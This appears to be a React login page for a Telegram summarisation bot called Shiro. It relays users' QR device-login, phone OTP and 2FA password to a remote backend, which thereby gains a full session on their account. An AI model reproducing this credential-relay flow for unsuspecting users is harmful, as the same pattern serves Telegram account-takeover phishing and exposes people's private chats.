
import React, { useState, useEffect } from "react";
import axios from "axios";

const App = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [otp, setOtp] = useState("");
  const [phoneCodeHash, setPhoneCodeHash] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [authStep, setAuthStep] = useState("qr");
  const [sessionToken, setSessionToken] = useState("");
  const [popupVisible, setPopupVisible] = useState(false);
  const [qrCodeLink, setQrCodeLink] = useState(null);
  const [loading, setLoading] = useState(false);
  const [otpSent, setOtpSent] = useState(false);
  const [accountPassword, setAccountPassword] = useState(null);
  const [password, setPassword] = useState(''); // For storing the password input
  const [showPasswordForm, setShowPasswordForm] = useState(false); // For showing/hiding the password form
  const [show2FAForm, setShow2FAForm] = useState(false);
  const [qrCode, setQrCode] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [status, setStatus] = useState('initial');
  const [error, setError] = useState(null);
  const [user, setUser] = useState(null);

  const backendUrl = "https://telegrambackend-production.up.railway.app";


  useEffect(() => {
    
    handleReset()
  }, [])
  

  const handleReset = async () => {
    try {
      const response = await fetch(`${backendUrl}/reset`, { method: 'GET' });

      if (response.ok) {
        const result = await response.text();
        console.log(result)
      
      } else {
        throw new Error('Failed to reset');
      }
    } catch (error) {
    
    }
  };


  //---------------QR code-----------------------
  useEffect(() => {
    // Automatically generate QR code when component mounts
    if (status === 'initial') {
      generateQRCode();
    }
  }, []);

  const generateQRCode = async () => {
    try {
      setLoading(true);
      setError('');

      const response = await axios.get(`${backendUrl}/generate-qr`, {
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        }
      });

      if (response.data.qrCode && response.data.sessionId) {
        setQrCode(response.data.qrCode);
        setSessionId(response.data.sessionId);
        setStatus('scanning');
      } else {
        throw new Error('Invalid response format');
      }
    } catch (err) {
      setError(err.message || 'Failed to generate QR code');
      setStatus('initial');
    } finally {
      setLoading(false);
    }
  };


  useEffect(() => {
    let interval;
    if (sessionId && status === 'scanning') {
      interval = setInterval(async () => {
        try {
          const response = await axios.get(`${backendUrl}/session-status/${sessionId}`);

          if (response.data.status === 'needs_password') {
            setStatus('password');
            setUser(response.data.user);
          } else if (response.data.status === 'active') {
            setStatus('active');
            setPopupVisible(true);
            setUser(response.data.user);
          }
        } catch (err) {
          console.error('Status check error:', err);
          setError('Failed to check login status');
        }
      }, 3000); // Check every 3 seconds
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [sessionId, status]);

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    try {
      setLoading(true);
      setError('');

      const response = await axios.post(`${backendUrl}/verify-password`, {
        sessionId,
        password
      });

      if (response.data.success) {
        setStatus('active');
        setPopupVisible(true);
        setUser(response.data.user);
      }
    } catch (err) {
      setError(err.response?.data?.error || 'Failed to verify password');
    } finally {
      setLoading(false);
    }
  };

  const handleRetry = () => {
    setStatus('initial');
    setError('');
    setQrCode('');
    setSessionId('');
    setPassword('');
    generateQRCode();
  };

  //-----------------------------------------

  const sendOTP = async () => {
    try {
      const response = await fetch(`${backendUrl}/set-phone-number`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phoneNumber }),
      });

      const data = await response.json();

      if (!response.ok) {
        if (response.status === 429) {
          const minutes = Math.floor(data.waitTime / 60);
          const seconds = data.waitTime % 60;

          setError(`Too many attempts. Please wait ${minutes} minutes and ${seconds} seconds before trying again.`)
        }
        setError(data.message)
        throw new Error(data.message);
      }
      setOtpSent(true)
      return data;
    } catch (error) {
      // Handle the error in your UI
      console.error('Error:', error);

    }
  };

  const validateOTP = async () => {
    setLoading(true);
    try {
      const response = await fetch(`${backendUrl}/set-phone-code`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phoneCode: otp }),
      });

      const data = await response.json();

      console.log(data, "-------------------- ------------ -----")
      if (!response.ok) {
        throw new Error(data.message);
      }


      if (data.isLoggedIn) {
        setPopupVisible(true);
      } else if (data.requires2FA) {
        setShow2FAForm(true);
      }
    } catch (error) {
      setError(error.message || 'OTP Validation Failed');
    }
    setLoading(false);
  };

  const verify2FAAndComplete = async () => {
    setLoading(true);
    try {
      await fetch(`${backendUrl}/set-password`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });

      alert("Login process initiated. Check the backend logs.");
      setPopupVisible(true)
    } catch (error) {
      console.error('2FA Error:', error);
      setError(error.response?.data?.message || '2FA verification failed');
    }
    setLoading(false);
  };


  const openShiroChat = () => {
    window.open("https://t.me/shiro_0bot?start=start", "_blank");
  };



  const renderPopup = () => (
    popupVisible && (
      <div style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100%",
        height: "100%",
        backgroundImage: "url('/backgroundImage.jpg')", // Add your image path here
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        zIndex: 1000,
      }}>

        <div style={{
          height: "100vh",
          width: "100vw",
          position: "absolute",
          zIndex: "-2",
          opacity: "0.7",
          backgroundColor: "black",
        }}>
        </div>
        <div style={{
          position: "relative",
          backgroundColor: "#212121",
          padding: "20px",
          borderRadius: "20px",
          width: "400px",
          textAlign: "center",
          boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.2)",
        }}>

          <h2 style={{ marginBottom: "20px", color: "#fff" }}>
            Shiro is Connected!
          </h2>
          <p style={{ marginBottom: "20px", color: "#737578" }}>
            You will now get summaries based on your chats.
            <br />
            <strong>@shiro_0bot</strong>
          </p>
          <button
            onClick={openShiroChat}
            style={{
              padding: "10px 20px",
              backgroundColor: "#147BE3",
              color: "#fff",
              border: "none",
              borderRadius: "20px",
              cursor: "pointer",
              fontWeight: "bold",
            }}
          >
            Open Shiro
          </button>
        </div>
      </div>
    )
  );

  const renderQRSection = () => (
    <div style={{ textAlign: "center" }}>
      <p style={{
        marginBottom: "20px",
        color: "white"
      }}>
        Go to Telegram: Settings, tap on Devices and scan.
      </p>
      {!loading && status === 'scanning' && qrCode && (
        <div className="text-center space-y-4">
          <img
            src={qrCode}
            alt="Telegram QR Code"
            className="mx-auto max-w-[200px] rounded-lg shadow-sm"
          />
        </div>
      )}
      {!loading && status === 'password' && (
        <form onSubmit={handlePasswordSubmit} className="space-y-4">
          <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
            Enter 2FA Password
          </h2>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter your 2FA password"
            style={{
              width: "93%",
              padding: "10px",
              marginBottom: "15px",
              backgroundColor: "#17212b",
              color: "#fff",
              border: "1px solid #2a5277",
              borderRadius: "5px",
            }}
          />


          <button
            type="submit"
            style={{
              width: "100%",
              padding: "10px",
              backgroundColor: "#147BE3",
              color: "#fff",
              border: "none",
              borderRadius: "20px",
              cursor: "pointer",
            }}
          >
            {loading ? 'Verifying...' : 'Submit Password'}
          </button>
        </form>

      )}
    </div>
  );

  const renderAuthStep = () => (
    <div style={{
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      height: "100vh",
      backgroundImage: "url('/backgroundImage.jpg')",
      backgroundSize: "cover",
      backgroundPosition: "center",
      backgroundRepeat: "no-repeat",
      zIndex: 4,
    }}>
      <div style={{
        height: "100vh",
        width: "100vw",
        position: "absolute",
        zIndex: "5",
        opacity: "0.7",
        backgroundColor: "black",
      }}></div>

      <div style={{
        width: "300px",
        padding: "20px",
        backgroundColor: "#212121",
        borderRadius: "20px",
        position: "relative",
        zIndex: "10"
      }}>
        {!show2FAForm ? (
          <>
            {/* Hide QR and Phone buttons when OTP is sent */}
            {!otpSent && (
              <div style={{
                display: "flex",
                justifyContent: "center",
                marginBottom: "20px",
              }}>
                <button
                  onClick={() => {
                    setAuthStep("qr");
                    setError(null);
                    setQrCodeLink(null);
                  }}
                  style={{
                    padding: "10px 20px",
                    backgroundColor: authStep === "qr" ? "#147BE3" : "transparent",
                    color: "#fff",
                    border: "none",
                    borderRadius: "20px 0 0 20px",
                    cursor: "pointer",
                  }}
                >
                  QR Code
                </button>
                <button
                  onClick={() => {
                    setAuthStep("phone");
                    setError(null);
                  }}
                  style={{
                    padding: "10px 20px",
                    backgroundColor: authStep === "phone" ? "#147BE3" : "transparent",
                    color: "#fff",
                    border: "none",
                    borderRadius: "0 20px 20px 0",
                    cursor: "pointer",
                  }}
                >
                  Phone
                </button>
              </div>
            )}

            {/* Show the QR section or Phone OTP input based on the state */}
            {authStep === "qr" && !otpSent ? renderQRSection() : (
              <div>
                {!otpSent ? (
                  <div>
                    <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
                      Enter Phone Number
                    </h2>
                    <input
                      type="tel"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="+1234567890"
                      style={{
                        width: "93%",
                        padding: "10px",
                        marginBottom: "15px",
                        backgroundColor: "#17212b",
                        color: "#fff",
                        border: "1px solid #2a5277",
                        borderRadius: "5px",
                      }}
                    />
                    <button
                      onClick={sendOTP}
                      style={{
                        width: "100%",
                        padding: "10px",
                        backgroundColor: "#147BE3",
                        color: "#fff",
                        border: "none",
                        borderRadius: "20px",
                        cursor: "pointer",
                      }}
                    >
                      {loading ? "Sending..." : "Send OTP"}
                    </button>
                  </div>
                ) : (
                  <div>
                    <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>Enter OTP</h2>
                    <input
                      type="text"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value)}
                      placeholder="Enter OTP"
                      style={{
                        width: "93%",
                        padding: "10px",
                        marginBottom: "15px",
                        backgroundColor: "#17212b",
                        color: "#fff",
                        border: "1px solid #2a5277",
                        borderRadius: "5px",
                      }}
                    />
                    <button
                      onClick={validateOTP}
                      style={{
                        width: "100%",
                        padding: "10px",
                        backgroundColor: "#147BE3",
                        color: "#fff",
                        border: "none",
                        borderRadius: "20px",
                        cursor: "pointer",
                      }}
                    >
                      {loading ? "Validating..." : "Validate OTP"}
                    </button>
                  </div>
                )}
              </div>
            )}
          </>
        ) : (
          // 2FA Password Form
          <div>
            <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
              Enter 2FA Password
            </h2>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter your 2FA password"
              style={{
                width: "93%",
                padding: "10px",
                marginBottom: "15px",
                backgroundColor: "#17212b",
                color: "#fff",
                border: "1px solid #2a5277",
                borderRadius: "5px",
              }}
            />
            <button
              onClick={verify2FAAndComplete}
              style={{
                width: "100%",
                padding: "10px",
                backgroundColor: "#147BE3",
                color: "#fff",
                border: "none",
                borderRadius: "20px",
                cursor: "pointer",
              }}
            >
              {loading ? "Verifying..." : "Confirm"}
            </button>
          </div>
        )}
        {error && (
          <p style={{ color: "red", textAlign: "center", marginTop: "10px" }}>
            {error}
          </p>
        )}
      </div>
    </div>
  );



  return (
    <>
      {renderPopup()}
      {renderAuthStep()}
    </>
  );
};

export default App;